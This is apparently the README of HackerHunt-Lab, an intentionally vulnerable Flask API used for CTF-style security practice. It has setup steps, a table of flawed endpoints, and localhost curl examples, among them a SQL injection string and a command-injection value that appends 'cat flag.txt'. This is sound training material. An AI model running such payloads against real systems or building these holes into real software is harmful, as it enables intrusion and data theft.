# API-Lab
An intentionally vulnerable API lab for practicing API security testing with Postman &amp; Burp Suite.  Includes common flaws like SQLi, IDOR, Broken Auth, CORS misconfig, and File Upload vulnerabilities.  For educational use only.
# HackerHunt-Lab API

A CTF-style vulnerable API lab built with Flask for security learners to practice exploiting common vulnerabilities.
 🔑 Broken Authentication
- 🔎 Insecure Direct Object Reference (IDOR)
- 💉 SQL Injection
- ⚡ Command Injection
- 🕵️ Information Disclosure
- 🌍 CORS Misconfiguration
- 📂 File Upload Vulnerabilities

Each vulnerable endpoint is designed to teach common API exploitation techniques in a **safe, controlled environment**.


## 🚀 Setup Instructions

### 1. Clone repository

```bash
git clone https://github.com/yourusername/Packard-Tricks-Associate.git
cd Packard-Tricks-Associate

2. Install dependencies

pip install -r requirements.txt

3. Run the app

python app.py

The API will start on http://0.0.0.0:5000.



🐳 Docker Usage

Build the Docker image:


docker build -t hackerhunt-lab .

Run the container:


docker run -p 5000:5000 hackerhunt-lab


📋 Vulnerable Endpoints

| Endpoint                        | Description                           | Method   | Notes                                |
|--------------------------------|-------------------------------------|----------|-------------------------------------|
| /vuln/auth/login              | Broken Authentication                | POST     | Weak password check, bypass to get flag |
| /vuln/idor/item/<id>          | IDOR                               | GET      | Access other users' items, flag in Bob's item #3 |
| /vuln/sqli/search?q=          | SQL Injection                      | GET      | Inject ' OR '1'='1 to reveal flag |
| /vuln/cmdinject/ping?ip=      | Command Injection                  | GET      | Inject ; cat flag.txt to get flag |
| /vuln/info/debug              | Information Disclosure             | GET      | Returns secret config including flag |
| /vuln/cors/data               | CORS Misconfiguration             | GET      | Allows any origin, returns flag     |
| /vuln/upload                  | File Upload                       | POST     | Upload evil.txt to get flag       |



🔍 Example curl Requests

Broken Authentication (Bypass)

curl -X POST http://localhost:5000/vuln/auth/login -H "Content-Type: application/json" -d '{"username":"alice","password":"letmein"}'

IDOR Access Bob's secret item

curl http://localhost:5000/vuln/idor/item/3

SQL Injection

curl "http://localhost:5000/vuln/sqli/search?q=' OR '1'='1"

Command Injection

curl "http://localhost:5000/vuln/cmdinject/ping?ip=127.0.0.1; cat flag.txt"

Information Disclosure

curl http://localhost:5000/vuln/info/debug

CORS Misconfiguration

curl http://localhost:5000/vuln/cors/data

File Upload

curl -F "file=@evil.txt" http://localhost:5000/vuln/upload


🛠️ Using Postman & Burp Suite


Postman: Import endpoints as requests, set method and parameters accordingly.

Burp Suite: Proxy your requests through Burp to intercept, modify, and replay.

Test injection points (e.g., SQLi, Command Injection) by manipulating parameters.

Observe flags returned when vulnerabilities are successfully exploited.



⚠️ Disclaimer

This project is for educational purposes only. Use it only in authorized environments and labs.

Do NOT deploy this vulnerable app in production or public-facing servers.



Happy hacking! 🔐
